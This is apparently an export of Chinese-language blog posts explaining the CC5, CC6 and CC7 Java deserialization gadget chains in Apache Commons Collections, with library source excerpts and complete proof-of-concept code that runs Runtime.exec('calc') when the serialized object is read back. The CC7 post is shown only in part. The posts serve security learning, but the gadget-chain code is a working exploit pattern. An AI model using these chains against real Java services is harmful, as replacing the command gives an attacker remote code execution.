<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>最终代码如下</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC6链</title>
    <url>/2025/02/24/CC6%E9%93%BE/</url>
    <content><![CDATA[<h1 id="GcpnO">CC6链</h1>

<p><strong>tips：cc6这条链是不受jdk版本限制的</strong></p>
<p>cc6的入口换成了<code>HashMap</code>的<code>readObject</code>方法，这条链实际是要调用<strong>LazyMap的get方法</strong>，后面的部分就和ysoserial中的cc1后半链一样了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734695541337-3f67c49d-2811-4060-92e2-afaf8ccda159.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734695541337-3f67c49d-2811-4060-92e2-afaf8ccda159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>当时我们说URLDNS链中讲到了 <code>HashMap</code>的<code>readObject</code>方法，调用了<code>hashCode</code>方法，现在我们需要去找一个类，它的<code>hashCode</code>方法需要去调用<code>LazyMap</code>的<code>get</code>方法</p>
<h2 id="ZDM3m">CC6攻击链分析</h2>
<h3 id="DpHqE">调用LazyMap.get</h3>
这里就是`TiedMapEntry`类（以下是该类的部分代码）

<p>该类的<code>hashCode</code>方法调用了自身类的<code>getValue</code>方法，该方法中调用了map的<code>get</code>方法，该类的map和key参数都是可控的，map为<code>LazyMap</code>时，就会调用<code>LazyMap</code>的<code>get</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>剩下的部分都和cc1是相同的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1, chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>现在我们需要一个构造TiedMapEntry类，由于它是public属性的，我们直接new就可以了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//其中将lazyMap放入他的map位置，因为上面说了，调用的是map的get方法</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>)</span><br><span class="line"><span class="comment">//构造一个HashMap去存TiedMapEntry，调用key位置的hashcode方法</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(entry, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>下面我会给出链子相关的源码，来简单看一下这条链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HashMap.readObject部分源码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// HashMap.hash源码</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// TiedMapEntry.hashCode源码</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>构造的poc如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(entry, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="B4BFR">最后调整</h2>
现在有一个问题就是，在put(entry,1)的时候，就已经触发了计算器

<p>是因为在HashMap的put方法时，就已经触发了它的hash方法（部分代码rux）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们现在回到URLDNS那个链的想法，先传入一个无用的东西，然后通过反射修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前面将lazyMap中的一个值换为一个无用的值</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">// 这里通过反射来修改回来</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>但是实际情况还是无法执行，我们跟进去看一下</p>
<p>这里实际上说，如果在map中没有这个key的话，就把他put进去，实际上确实是没有这个key的，所以它也确实put了一个东西进去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态调试跟到这里</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以简单跟一下，在最后的LazyMap.get中put了一个键值对，这个key就是我们在构造<code>TiedMapEntry</code>时所传入的key</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CC6.java</span></span><br><span class="line">map2.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line"><span class="comment">// HashMap.put</span></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// HashMap.hash</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// LazyMap.get</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里也很简单，只需要把put进去lazyMap的remove掉不就好了吗（最终poc如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map2.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">    lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    serialize(map2);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734701609200-25c4e7fb-0063-4c31-8bdc-e7bfb47e6321.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734701609200-25c4e7fb-0063-4c31-8bdc-e7bfb47e6321.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC7链</title>
    <url>/2025/03/02/CC7%E9%93%BE/</url>
    <content><![CDATA[<h1 id="dNKB5">CC7</h1>
cc7与cc5大同小异，也是后面部分不变，变的只是入口的地方

<h2 id="YVQSz">CC7攻击链分析</h2>
<h3 id="UAfmG">思路分析</h3>

<p>cc7这里的入口点使用了<code>Hashtable</code></p>
<p>这里我们简单分析一下，入口类是<code>Hashtable</code>的<code>readObject</code>，调用本身的<code>reconstitutionPut</code>方法，进入<code>reconstitutionPut</code>看一下（这里我们不分析怎么找到的可以利用的点），这里我们要调用<code>equals</code>方法，我们需要找到一个类的<code>equals</code>方法可以利用</p>
<p>在<code>AbstractMap.equals</code>中存在<code>m.get</code>方法，就可以接上之前的<code>LazyMap.get</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Hashtable.readObject</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Hashtable.reconstitutionPut</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面是这两个类的继承关系，后面的话会根据这两个地方进行做文章，因为逆向流程不太好讲，我们这里从正向开始分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LazyMap</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//HashMap</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt;</span><br></pre></td></tr></table></figure>

<h3 id="GeLyE">AbstractMapDecorator#equals</h3>

<p>当我们在<code>reconstitutionPut</code>中调用<code>e.key.equals(key)</code>时，我们想让这里调用<code>LazyMap.equals</code>，但实际上<code>LazyMap</code>并不存在<code>equals</code>方法，因此会找到他的父类<code>AbstractMapDecorator</code>，调用它的<code>equals</code>方法</p>
<blockquote>
<p>并不是<code>AbstractMapDecorator</code>的<code>equals</code>有问题，而是当作一个桥梁去调用<code>AbstractMap</code>的<code>equals</code>方法</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//AbstractMapDecorator.equals</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.equals(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="JDvib">AbstractMap#equals</h3>

<p>在<code>AbstractMapDecorator.equals</code>方法中，也调用了<code>map.equals(object)</code>，这次这里我们想让他调用<code>HashMap.equals</code></p>
<p>但因为<code>HashMap</code>中没有<code>equals</code>方法，会寻找它的父类<code>AbstractMap</code>，调用父类的<code>equals</code>方法，在该方法中存在<code>m.get(key)</code>，可以调用<code>LazyMap.get</code>方法，相信这里都不陌生了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractMap.equals</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Oj8m7">小结</h3>

<p>最后顺一下，是要调用<code>LazyMap</code>的<code>equals</code>方法，然后<code>LazyMap</code>中没有<code>equals</code>方法，就会调用它的父类<code>AbstractMapDecorator</code>的<code>equals</code>方法，其中<code>map.equals(object)</code>，m是我们一个<code>HashMap</code>，但是<code>HashMap</code>并没有<code>equals</code>方法，所以还是找到其父类<code>AbstractMap</code>，去调用他的<code>equals</code>方法，从而调用<code>LazyMap</code>的<code>get</code>方法</p>
<h2 id="F9PLA">调整</h2>
<h3 id="kzep2">put两次</h3>

<p><font style="color:rgb(51, 51, 51);">如果</font><code>Hashtable</code><font style="color:rgb(51, 51, 51);">中只有一个元素的话是不会走入判断的调用</font><code>equals</code><font style="color:rgb(51, 51, 51);">方法的，我们就可以通过</font><code>Hashtable</code><font style="color:rgb(51, 51, 51);">添加两个元素，第二个元素的我们传入一个我们构造的LazyMap对象</font></p>
<p><font style="color:rgb(51, 51, 51);">另一个是我们在最开始Hashtable.reconstitutionPut()方法中的必须hash相同（yso里面给出的是’yy’和’zZ’），也就是hash碰撞问题</font></p>
<blockquote>
<p>应该是下面这段代码的原因，比较之前的参数的hash与当前参数的hash，相同才会走进&amp;&amp;后的判断</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(51, 51, 51);">还有一个是我们</font><code>AbstractMap.equals()</code><font style="color:rgb(51, 51, 51);">中个数需要相同。</font></p>
